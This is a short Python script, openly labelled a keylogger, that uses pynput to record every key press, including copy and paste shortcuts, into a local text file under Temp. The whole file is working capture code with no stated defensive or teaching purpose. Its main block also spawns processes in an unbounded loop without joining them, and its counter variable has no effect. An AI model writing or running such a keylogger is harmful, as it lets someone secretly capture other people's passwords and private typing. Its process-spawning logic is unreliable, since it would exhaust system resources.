from pynput.keyboard import Listener
import multiprocessing as mp
import time

# keyloger
def keystroke(key):
    print("keylogger")
    i = 0
    key = str(key).replace("'","")
 
    if key == "\\x03":
        key = "\nshortcut Copy\n"

    if key == "\\x16":
        key = "\nshortcut Paste\n"

    if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
        key = ''
    else:
        key += ' '
    
    if i != 1:
        with open("Temp\\Keylogger.txt", 'a') as f:
            f.write(key)
            i = 1
        print(i)
    time.sleep(0.1)

# keyloger phase
def keyphase():
    print("phase")
    with Listener(on_press=keystroke) as l:
        l.join()
        time.sleep(0.1)

def hello():
    print("Hello")


if (__name__ == '__main__'):
    while 1:
        k = mp.Process(target=keyphase)
        h = mp.Process(target=hello)
        k.start()
        h.start()
        
        
        
